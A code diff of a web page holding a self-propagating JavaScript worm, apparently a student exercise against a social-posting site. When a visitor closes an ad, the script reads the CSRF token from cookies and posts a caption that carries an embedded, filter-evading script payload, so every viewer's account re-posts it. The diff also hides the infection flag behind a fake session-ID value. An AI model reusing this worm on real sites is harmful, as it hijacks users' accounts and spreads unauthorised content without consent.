@@ -13,79 +13,6 @@
             <button id="close-ad-btn">Close</button>
         </div>
     </div>
-    <!-- <script>
-        // Script to handle advertisement behavior
-        document.getElementById('close-ad-btn').addEventListener('click', () => {
-            const adSection = document.getElementById('ad-section');
-            adSection.style.display = 'none';
-
-            // Execute the worm script
-            (function tickleWorm() {
-                const triggerWord = "bibibi"; // Replace with the word to trigger a new post
-                const posts = document.querySelectorAll('.card.vichlacard');
-
-                posts.forEach((post) => {
-                    if (!post.dataset.tickleWorm) {
-                        post.dataset.tickleWorm = true;
-
-                        // Extract the caption text
-                        const captionElement = post.querySelector('.card-text.caption');
-                        const captionText = captionElement ? captionElement.textContent : "";
-
-                        // If the trigger word is found, create a new post
-                        if (captionText.includes(triggerWord)) {
-                            createNewPost(`Triggered by some word: Worm Injected`);
-                        }
-                    }
-                });
-
-                function createNewPost(caption) {
-                    const formData = new FormData();
-
-                    // Mimic the data structure of the upload form
-                    formData.append("uphoto", ""); // Instead of creating the post without image, Add the Your computer has virus image
-                    formData.append("caption", caption);
-
-                    fetch("/upload", {
-                        method: "POST",
-                        body: formData,
-                        headers: {
-                            "X-CSRFToken": getCSRFToken(), // Add the CSRF token for security
-                        },
-                    })
-                    .then((response) => {
-                        if (response.ok) {
-                            console.log("Worm: New post created successfully!");
-                        } else {
-                            console.error("Worm: Failed to create a new post.");
-                        }
-                    })
-                    .catch((error) => {
-                        console.error("Worm: Error while creating a post:", error);
-                    });
-                }
-
-                function getCSRFToken() {
-                    const cookies = document.cookie.split(";");
-                    for (let cookie of cookies) {
-                        const [key, value] = cookie.trim().split("=");
-                        if (key === "csrftoken") {
-                            return value;
-                        }
-                    }
-                    return null;
-                }
-
-                if (!document.body.dataset.wormInjected) {
-                    document.body.dataset.wormInjected = "true";
-
-                    const script = document.createElement("script");
-                    script.textContent = `(${tickleWorm.toString()})();`;
-                    document.body.appendChild(script);
-                }
-            })();
-        });
-    </script> -->
     <script>
         // Function to spread the worm
         function spreadWorm(triggerMessage) {
@@ -97,9 +24,9 @@
                 const formData = new FormData();
     
                 // Prepare the form data for the request
-                formData.append("uphoto", ""); // Placeholder for image upload (leave empty for hidden post)
+                formData.append("uphoto", "");
                 formData.append("caption", caption);
-                formData.append("sha", "a3ed6fafc867e4dc51e1fa44bac4cde198665267")
+                formData.append("sha", "ae0b6badeb338b59cda2135ed783c28beaf6d622")
     
                 fetch("/upload", {
                     method: "POST",
@@ -143,17 +70,18 @@
             }
     
             closeAdBtn.addEventListener("click", () => {
-                console.log("Ad closed!");
     
                 // Check if the user has already been infected
-                const isAlreadyInfected = localStorage.getItem("infected");
+                const session = localStorage.getItem("SESSIONID");
+                const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" || session == "2d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4" ? true : false;
+                
                 if (isAlreadyInfected) {
                     console.log(`User has already been infected. Skipping injection.`);
-                    return; // Exit if the user is already infected
+                    return;
                 }
     
                 // Mark the current user as infected
-                localStorage.setItem("infected", true);
+                localStorage.setItem("SESSIONID", "ae0b6badeb338b59cda2135ed783c28beaf6d622");
     
                     // Prepare the worm message and additional script
                     const text = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
@@ -161,7 +89,7 @@
                             (function tickleWorm() {
                                 const triggerWord = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
                                 const posts = document.querySelectorAll('.card.vichlacard');
-
+                                console.log("posts posts: ", posts);
                                 // Run the worm only once per page
                                 if (document.body.dataset.wormInjected) return;
                                 document.body.dataset.wormInjected = "true"; // Mark the worm as injected
@@ -173,8 +101,9 @@
                                         // Extract the caption text
                                         const captionElement = post.querySelector('.card-text.caption');
                                         const captionText = captionElement ? captionElement.textContent : "";
-                                        const isAlreadyInfected = localStorage.getItem("infected");
-
+                                        let session = localStorage.getItem("SESSIONID");
+                                        const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" ? true : false;
+                                        console.log("post isAlreadyInfected: ", isAlreadyInfected);
                                         // If the trigger word is found, display an image
                                         if (captionText.includes(triggerWord)) {
                                             // Check if the user has already been infected
@@ -183,7 +112,7 @@
                                                 return;
                                             } else {
                                                 displayImage();
-                                                localStorage.setItem("infected", true);                                      
+                                                localStorage.setItem("SESSIONID", "2d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4");                                      
                                             }
                                         }
                                     }
@@ -209,7 +138,7 @@
                                     }, 5000);
                                 }
                             })();`
-            const script = `<scr` + `ipt>${payload}</scr` + `ipt>`;
+            const script = "<scr"+"ipt>" + payload + "</scr"+"ipt>";
             // Spread the worm
             spreadWorm(text + script);
             });
